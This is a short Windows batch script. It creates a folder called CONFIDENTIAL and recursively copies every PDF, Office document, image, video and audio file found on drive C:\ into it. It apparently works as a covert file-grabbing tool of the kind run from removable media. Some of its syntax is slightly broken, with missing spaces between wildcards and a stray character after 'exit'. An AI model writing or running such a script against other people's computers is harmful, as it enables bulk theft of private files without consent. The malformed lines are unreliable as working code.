@echo off
IF NOT EXIST  ".\CONFIDENTIAL" MD ".\CONFIDENTIAL"
cd .\CONFIDENTIAL
for /R C:\ %%x in (*.pdf *.docx *.xlsx *.mp4 *.wav *.jpg *.jpeg *.png*.mkv*.mp3) do copy "%%x" ".\"
exit?